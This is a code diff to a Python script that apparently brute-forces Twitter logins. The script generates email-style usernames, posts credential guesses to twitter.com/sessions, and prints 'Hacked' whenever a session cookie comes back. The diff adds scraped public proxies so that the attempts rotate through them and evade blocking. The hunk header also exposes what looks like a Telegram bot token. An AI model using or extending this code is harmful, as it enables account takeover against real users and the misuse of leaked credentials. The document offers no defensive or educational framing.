@@ -16,15 +16,15 @@ token='5663483826:AAEm_gvlImAJ9guRuDoR8HNrN8CxmejnJEI'
 from Proxy_List_Scrapper import Scrapper, Proxy, ScrapperException
 from pprint import pprint
 def pro():
-    Category='US'
+    Category='ALL'
     proxy = Scrapper(category=Category, print_err_trace=False)
     data = proxy.getProxies()
     for item in data.proxies:
-        c = item.ip, item.port
-        return c[0]
+        open('prox.txt','w').write(item.ip+':'+item.port)
 
 
-def CHECK(user,pess):
+
+def CHECK(user,pess,prox):
 
 	head={
 		#head-data by @6g7r
@@ -51,7 +51,7 @@ def CHECK(user,pess):
 	try:
 		time.sleep(0.7)
 		
-		req=requests.post('https://twitter.com/sessions',headers=head,data=data,proxies=None,timeout=3)
+		req=requests.post('https://twitter.com/sessions',headers=head,data=data,proxies=prox,timeout=3)
 		if ("ct0") in req.cookies:
 			print(colorama.Fore.GREEN+'--------------------------------')
 			print(f'Hacked: [{user}:{pess}] ')
@@ -79,8 +79,12 @@ while True:
     rx = ['0','1','2','3','4']
     xr = random.choice(rx)
     Email = q+'78'+xr+user
-    
-    
-    
-    CHECK(user=Email,pess=pas)
+    pro()
+    pxx = open('prox.txt','r').read()
+    proxx={
+			'http': f'http://{pxx}',
+			'https': f'https://{pxx}'
+			}
+	
+    CHECK(user=Email,pess=pas,prox=proxx)
 
